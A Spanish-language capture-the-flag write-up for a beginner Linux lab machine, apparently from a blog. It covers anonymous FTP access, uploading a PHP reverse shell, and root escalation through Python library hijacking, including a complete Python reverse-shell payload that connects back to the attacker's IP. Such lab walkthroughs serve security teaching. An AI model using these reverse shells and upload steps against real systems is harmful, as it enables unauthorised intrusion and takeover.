---
title: "TheHackerLabs - Principiante : [Cyberpunk]"
date: 2024-09-06 19:10:00 +0200
categories: [CTF, Writeups, TheHackerLabs, Linux, Principiante]
tags: [CTF, Writeups, TheHackerLabs, Linux, Principiante]
image: /img/posts/CTF/cyberpunk/image.png
---


## Introducción

Bienvenidos al desafío **"Cyberpunk - Relic Infiltration"**, un CTF basado en Linux para principiantes. Este writeup narramos paso a paso cómo se llevó a cabo la infiltración y explotación de vulnerabilidades, desde el reconocimiento inicial hasta la escalada de privilegios y obtención de acceso como **root**.

## Identificación de la Red

Empezamos identificando la IP de la máquina objetivo utilizando el comando `ip a` para verificar nuestra configuración de red y luego con `arp-scan` escaneamos la red local en busca de la IP de la máquina vulnerable.

```bash
❯ ip a
```


```bash
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 10.0.2.5/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
```

Ahora ejecutamos `arp-scan` para identificar las máquinas en la red.

```bash
❯ arp-scan -I eth0 --localnet
```



```bash
10.0.2.8    08:00:27:43:1e:91   (Unknown)
```

## Escaneo de Puertos con Nmap

Procedemos con un escaneo completo de puertos utilizando `nmap` para identificar servicios expuestos.

```bash
❯ nmap -p- -Pn -n --min-rate 2000 10.0.2.8 -oG allports
```



```bash
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Realizamos un escaneo más detallado en los puertos 21, 22 y 80.

```bash
❯ nmap -sSCV -p21,22,80 -vvv 10.0.2.8 -oN ports
```


Puerto 21 con acceso anónimo, un archivo `index.html`, y un archivo `secret.txt`. El puerto 80 presenta un servidor HTTP Apache.


## Acceso al FTP Anónimo

Nos conectamos al servicio FTP usando acceso anónimo.

```bash
❯ ftp anonymous@10.0.2.8
Password: 
ftp> ls
```

Archivos disponibles:

```bash
-rw-r--r--   1 0        0             713 May  1 14:55 index.html
-rw-r--r--   1 0        0             923 May  1 08:51 secret.txt
```

Descargamos y analizamos el archivo `secret.txt`:

```bash
❯ cat secret.txt
```

Contenido de `secret.txt`:

```r
*********************************************
*                                           *
*        Hola Netrunner,                    *
*                                           *
*   Has sido contratado por el mejor fixer  *
*   de la ciudad para llevar a cabo una     *
*   misión crucial.                         *
*                                           *
*   Tenemos información de que Arasaka,     *
*   la mega-corporación más poderosa de     *
*   Night City, está migrando sus sistemas  *
*   y actualmente parece ser vulnerable.    *
*                                           *
*   Necesitamos que te infiltres en sus     *
*   sistemas y desactives el Relic para     *
*   salvar la vida de V.                    *
*                                           *
*   Te espero en Apache.                    *
*                                           *
*                         - Alt             *
*********************************************
```

## Subida de Reverse Shell

Descargamos un reverse shell PHP desde el repositorio de PentestMonkey.

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

Subimos el archivo PHP al servidor a través de FTP.

```bash
ftp> put php-reverse-shell.php
```

## Ejecución de Reverse Shell

A continuación, accedemos al puerto HTTP para ejecutar el archivo `php-reverse-shell.php`. Nos conectamos a nuestra máquina a través de Netcat:

```bash
❯ nc -lnvp 443
# whoami
www-data
```

## Escalada de Privilegios

Exploramos el sistema y encontramos un archivo interesante en `/opt/arasaka.txt`, que contiene una cadena cifrada en **Brainfuck**.

```bash
++++++++++[>++++++++++>++++++++++++>++++++++++>++++++++++>+++++++++++>+++++++++++>++++++++++++>+++++++++++>+++++++++++>+++++>+++++>++++++<<<<<<<<<<<<-]>-.>+.>--.>+.>++++.>++.>---.>.>---.>.>--.>-----..
```

Desciframos la cadena y encontramos información útil. Nos autenticamos como el usuario `arasaka` y descubrimos que podemos ejecutar un script Python con privilegios de `root`.

```bash
sudo -u root /usr/bin/python3.11 /home/arasaka/randombase64.py
```

### Explotación de la Vulnerabilidad

Usamos **Python Library Hijacking** para obtener acceso como root modificando el script.

```python
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.2.5", 4443))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
```

Nos conectamos nuevamente a través de Netcat, esta vez como **root**.

```bash
# whoami
root
```

## Conclusión

Al final del desafío, logramos infiltrarnos en los sistemas de Arasaka, desactivar el Relic y obtener acceso como root. Este writeup demuestra la importancia de la configuración adecuada de permisos y la protección de servicios expuestos.

Herramientas utilizadas:
- `nmap`
- `ftp`
- `netcat`
- `python`

Medidas de protección:
- Configuración correcta de permisos.
- Auditoría de servicios.
- Uso de autenticación multifactor para servicios sensibles.

¡Gracias por acompañarnos en este desafío!
